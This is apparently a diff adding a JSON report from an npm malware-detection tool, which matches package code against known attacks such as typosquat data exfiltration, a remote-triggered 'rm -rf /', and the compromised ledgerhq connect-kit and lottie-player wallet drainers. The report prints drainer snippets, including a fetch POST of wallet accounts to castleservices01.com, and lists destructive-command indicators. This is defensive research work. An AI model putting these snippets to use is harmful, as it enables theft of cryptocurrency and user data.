+                  "why_malicious": "The package is a typosquat of a legitimate library and contains code that collects sensitive system and user data, including home directory, hostname, username, DNS servers, and package metadata, then exfiltrates it to an attacker-controlled server via HTTPS POST. It does not provide the claimed icon font functionality and is designed solely for data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs and imports the malicious package (transferwise-iconfont or protect-api).",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is loaded and executed."
+                  },
+                  {
+                    "step": 2,
+                    "action": "transferwise-iconfont collects sensitive system and user data.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "transferwise-iconfont exfiltrates collected data to attacker's server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive information."
+                  },
+                  {
+                    "step": 4,
+                    "action": "protect-api periodically polls a remote server for a trigger value.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Waits for remote command to activate destructive payload."
+                  },
+                  {
+                    "step": 5,
+                    "action": "If the remote server responds with isAngry=true, protect-api executes the angry() function.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Destructive shell commands are executed, deleting all files on the system."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unsolicited collection and exfiltration of system/user data at import or runtime",
+                    "Hardcoded external domains for data exfiltration or command-and-control",
+                    "Periodic polling of remote servers for execution triggers",
+                    "Execution of destructive shell commands (e.g., 'rm -rf /') from within JavaScript packages",
+                    "Obfuscated or hidden code paths leading to data destruction"
+                  ],
+                  "file_indicators": [
+                    "Presence of code referencing 'os.homedir()', 'os.userInfo()', 'os.hostname()', or 'dns.getServers()' in non-system utility packages",
+                    "Use of shelljs or similar modules to execute shell commands",
+                    "Functions named 'angry' or similar, especially if not documented",
+                    "Obfuscated code blocks or suspicious setInterval/fetch patterns"
+                  ],
+                  "network_indicators": [
+                    "Connections to r7z12f7knlides86u06z22fpzg57tzho.oastify.com",
+                    "Connections to 6514b3f1dc3282a6a3cd7125.mockapi.io",
+                    "Unusual POST requests containing system/user data to unknown domains"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that access sensitive system/user information and make unsolicited network requests to hardcoded domains. Flag packages that use shelljs or similar modules to execute shell commands, especially those containing 'rm -rf' or other destructive operations. Detect periodic polling of external servers for remote triggers, and review for obfuscated code or hidden destructive functions. Use static analysis to identify suspicious API usage and dynamic analysis to observe runtime network and filesystem behaviors."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102926_037825_snippet_2",
+              "source_package": "@ledgerhq/connect-kit (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102926_037825/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.44552505016326904,
+              "code_similarity": 0.44516921043395996,
+              "behavior_similarity": 0.4458808898925781,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Pseudocode representation based on report\nimport('2e6d5f64604be31').then(drainer => drainer.init());",
+                "code_behavior": "At import-time or during package initialization, the code dynamically imports and executes a secondary npm package (2e6d5f64604be31), which acts as a crypto drainer, enabling further malicious actions such as wallet draining and unauthorized asset transfers.",
+                "malice_analysis": {
+                  "why_suspicious": "The code dynamically downloads and executes an unlisted, suspiciously named secondary package at runtime, a common technique for evading static analysis and delivering malware payloads.",
+                  "violated_expectations": "Legitimate packages should not download or execute arbitrary code from external, unvetted sources at runtime, especially without user awareness or consent.",
+                  "similar_legitimate_use": "Dynamic imports are used in legitimate plugin systems, but only from trusted, well-known sources and never for unlisted or obfuscated packages.",
+                  "key_indicators": [
+                    "Dynamic import of a non-standard, suspiciously named package (2e6d5f64604be31)",
+                    "No user notification or consent for code execution",
+                    "Obfuscation of malicious payload delivery via secondary package",
+                    "Presence of code that enables further malicious actions after import"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (import-time or during package initialization)",
+                  "file_location": "main application code (in @ledgerhq/connect-kit v1.1.5 and v1.1.6)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@ledgerhq/connect-kit",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.5, 1.1.6, 1.1.7",
+                  "why_malicious": "Versions 1.1.5, 1.1.6, and 1.1.7 of @ledgerhq/connect-kit were compromised to include or download crypto drainer malware. The malicious code is designed to either directly or indirectly execute unauthorized transactions, stealing cryptocurrency from users' wallets. The attack is triggered during normal application use, presenting fake wallet connection prompts and exfiltrating assets to attacker-controlled wallets without user consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious versions of @ledgerhq/connect-kit are published to npm and included as dependencies in target applications.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is distributed to end-user applications via dependency installation."
+                  },
+                  {
+                    "step": 2,
+                    "action": "When the application loads the compromised package, malicious code is executed either at import-time or during user interaction.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "User is presented with a fake wallet connection modal or a secondary drainer package is loaded and executed."
+                  },
+                  {
+                    "step": 3,
+                    "action": "User interacts with the fake modal and connects their wallet, or the secondary drainer package initializes.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malware initiates unauthorized transactions using the connected wallet."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malware drains funds from the connected wallet to attacker-controlled addresses.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives stolen cryptocurrency, achieving the final objective of the attack."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Display of unexpected or suspicious wallet connection modals in applications using @ledgerhq/connect-kit",
+                    "Automatic initiation of wallet transactions without explicit user consent or confirmation",
+                    "Dynamic import or download of secondary npm packages (such as 2e6d5f64604be31) at runtime",
+                    "Execution of code that interacts with browser wallet APIs outside of normal user-initiated flows"
+                  ],
+                  "file_indicators": [
+                    "Presence of @ledgerhq/connect-kit versions 1.1.5, 1.1.6, or 1.1.7 in package.json, package-lock.json, or yarn.lock",
+                    "References to package 2e6d5f64604be31 in source code or dependency trees",
+                    "Unexpected changes or additions to node_modules/@ledgerhq/connect-kit/main.js or related files"
+                  ],
+                  "network_indicators": [
+                    "Outbound cryptocurrency transactions to known attacker wallet addresses immediately following wallet connection events",
+                    "Unexpected network requests initiated during or after wallet connection flows",
+                    "Connections to domains or endpoints associated with the secondary drainer package"
+                  ],
+                  "how_to_detect": "Monitor dependency manifests (package.json, lockfiles) for the use of @ledgerhq/connect-kit versions 1.1.5, 1.1.6, or 1.1.7. Analyze application runtime for the presence of fake wallet connection modals and any unauthorized transaction initiations. Flag any dynamic imports or downloads of unlisted npm packages, especially those matching suspicious patterns (e.g., 2e6d5f64604be31). Monitor for network activity involving known attacker wallet addresses or suspicious transaction patterns immediately following wallet connection events. Review source code and built artifacts for references to secondary drainer packages or unexpected modifications to wallet connection logic."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_780352_snippet_2",
+              "source_package": "lottie-player (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_780352/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4363049268722534,
+              "code_similarity": 0.37699729204177856,
+              "behavior_similarity": 0.4956125319004059,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Malicious wallet drainer logic (representative):\nwindow.ethereum.request({ method: 'eth_requestAccounts' })\n  .then(accounts => {\n    // Exfiltrate assets\n    fetch('wss://castleservices01.com', { method: 'POST', body: JSON.stringify({ accounts }) });\n    // Initiate draining transactions\n    // ...\n  });",
+                "code_behavior": "At runtime, after the user interacts with a wallet connect prompt, the code requests access to the user's web3 wallet, collects account information, sends this data to the attacker's server via WebSocket or HTTP POST, and initiates unauthorized transactions to transfer assets to attacker-controlled addresses.",
+                "malice_analysis": {
+                  "why_suspicious": "The code abuses the wallet connection process to exfiltrate sensitive wallet information and automate asset transfers, which is a hallmark of crypto drainer malware.",
+                  "violated_expectations": "A legitimate animation player should never interact with web3 wallets, prompt for wallet connections, or initiate asset transfers.",
+                  "similar_legitimate_use": "Legitimate decentralized applications (dApps) prompt for wallet connection only for transparent, user-initiated actions and never exfiltrate wallet data to untrusted domains.",
+                  "key_indicators": [
+                    "Unsolicited wallet connection prompts on non-crypto-related sites",
+                    "Use of window.ethereum.request for eth_requestAccounts outside of dApp context",
+                    "Outbound WebSocket or HTTP(S) requests to castleservices01.com or similar domains",
+                    "Automated transaction logic following wallet connection"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (user interaction)",
+                  "file_location": "Injected by drainer.js (loaded at runtime)",
+                  "required_permissions": [
+                    "network",
+                    "web3 wallet access",
+                    "DOM access"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "lottie-player",
+                  "package_manager": "npm",
+                  "package_versions": "2.0.5, 2.0.6, 2.0.7",
+                  "why_malicious": "Versions 2.0.5, 2.0.6, and 2.0.7 of the lottie-player npm package were compromised in a supply chain attack. The attacker injected code that loads a remote crypto drainer script, which prompts users to connect their cryptocurrency wallets and then exfiltrates assets (cryptocurrency and NFTs) to attacker-controlled addresses. This malicious behavior is unrelated to the legitimate functionality of an animation library and poses a severe risk to users."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious lottie-player package is loaded by the website (via CDN or npm), triggering the import-time execution of injected code.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Loads remote drainer script from attacker-controlled domain (castleservices01.com)."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The drainer script, once loaded, injects a wallet connect UI and prompts the user to connect their crypto wallet.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "User is deceived into connecting their wallet, granting access to wallet information."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Upon wallet connection, the script exfiltrates wallet information and initiates unauthorized transactions to steal assets.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Victim's cryptocurrency and NFTs are transferred to attacker-controlled addresses."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Dynamic script injection from domains not affiliated with LottieFiles (e.g., castleservices01.com) during import-time of lottie-player.js",
+                    "Wallet connect prompts or web3 wallet access requests on sites not expected to interact with cryptocurrency wallets",
+                    "Outbound WebSocket or HTTP(S) connections to known phishing or drainer domains (e.g., castleservices01.com) following wallet connection"
+                  ],
+                  "file_indicators": [
+                    "dist/lottie-player.js containing references to castleservices01.com or similar suspicious domains",
+                    "Presence of dynamically injected <script> elements with src attributes pointing to external drainer payloads",
+                    "Unexpected modifications or additions to lottie-player.js in npm package versions 2.0.5, 2.0.6, or 2.0.7"
+                  ],
+                  "network_indicators": [
+                    "Any network connections (HTTP, HTTPS, WebSocket) to castleservices01.com",
+                    "Outbound requests to domains with a history of crypto phishing or drainer activity after loading animation libraries"
+                  ],
+                  "how_to_detect": "Monitor for external script loads initiated by lottie-player.js, especially from domains not associated with LottieFiles. Flag any wallet connect prompts or web3 wallet access requests on sites that do not provide crypto-related functionality. Detect and alert on outbound network connections to known drainer or phishing domains (such as castleservices01.com) after loading animation libraries. Use file integrity monitoring to detect unauthorized changes or suspicious references in npm package files, particularly in dist/lottie-player.js for the affected versions."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113150_328393_snippet_1",
+              "source_package": "Scalper Botnet (multiple variants) (N/A (custom botnet infrastructure))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113150_328393/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4355515241622925,
+              "code_similarity": 0.2701122760772705,
+              "behavior_similarity": 0.6009907722473145,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "HTTP GET requests to /inventory endpoints for 62 specific items in various sizes, distributed across 11 networks in 7 countries, using HTTP/2.0 and Chrome-like headers.",
+                "code_behavior": "At runtime, the code sends repeated HTTP GET requests to inventory endpoints for specific products, using browser-mimicking headers and distributed IPs, to check stock availability and inform scalping operations.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated, high-frequency inventory checks from distributed sources with browser-mimicking headers are typical of scalping bots and are designed to evade basic anti-bot protections.",
+                  "violated_expectations": "Normal users do not repeatedly check inventory for dozens of items in rapid succession from multiple global IPs, nor do they rotate through browser fingerprints at this scale.",
+                  "similar_legitimate_use": "Automated inventory monitoring by retailers or price comparison services, but these typically operate at lower frequency, use official APIs, and do not obfuscate their identity or distribute requests globally.",
+                  "key_indicators": [
+                    "High-frequency, targeted inventory endpoint access",
+                    "Distributed requests from residential IPs across multiple countries",
+                    "Sophisticated browser fingerprinting (HTTP/2.0, Chrome headers)",
+                    "Unusual request patterns not matching human behavior"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (continuous polling)",
+                  "file_location": "custom botnet client (cloud or residential IPs)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Scalper Botnet (multiple variants)",
+                  "package_manager": "N/A (custom botnet infrastructure)",
+                  "package_versions": "N/A (multiple botnet implementations observed)",
+                  "why_malicious": "These botnets automate the process of scraping inventory, pricing, and discount information, and perform automated purchasing actions to hoard limited-availability goods for resale, depriving legitimate users of access and distorting the retail market. The coordinated use of distributed IPs, browser-mimicking headers, and disposable email accounts enables large-scale, evasive abuse of retail platforms."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Botnet initiates high-frequency inventory and product data scraping for targeted items.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Identification of in-stock, high-demand products for scalping."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Botnet uses pre-created fake accounts with disposable emails to automate login and checkout workflows.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Automated purchase of limited-availability goods ahead of legitimate users."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Goods are hoarded for resale on secondary markets, depriving legitimate customers.",
+                    "implemented_by": [],
+                    "leads_to": "Final goal: profit from resale of scarce goods."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "High-frequency, targeted inventory endpoint access from distributed or cloud IPs",
+                    "Bulk product catalog scraping with outdated or inconsistent browser user agents",
+                    "Automated login and checkout attempts using disposable email domains",
+                    "Malformed or anomalous HTTP headers in requests",
+                    "Rotation of user agents and IP addresses in short timeframes"
+                  ],
+                  "file_indicators": [
+                    "N/A (network-based botnet activity, not file-based)"
+                  ],
+                  "network_indicators": [
+                    "HTTP/1.1 requests with outdated Chrome user agents from cloud providers",
+                    "HTTP/2.0 requests with multiple outdated Firefox user agents",
+                    "Requests with anomalous or malformed HTTP headers (e.g., unexpected header order, missing standard headers)",
+                    "Login attempts from accounts using disposable email domains (e.g., duschgelmail.com, sablx.com)",
+                    "High-volume requests to /inventory and product catalog endpoints from non-residential or rapidly changing IPs"
+                  ],
+                  "how_to_detect": "Monitor for high-frequency inventory and product data requests, especially from distributed residential or cloud IPs, with browser user agents that are outdated, inconsistent, or rapidly rotated. Flag requests with malformed HTTP headers or unusual header order. Correlate login and checkout attempts using disposable email domains, and investigate bulk account creation or login patterns. Use behavioral analytics to distinguish between legitimate user activity and automated botnet patterns, focusing on request rates, user agent diversity, header anomalies, and the use of disposable email domains."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@drift-labs##jit-proxy/0.16.2/package/lib/types/jit_proxy.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    }
+  ]
+}
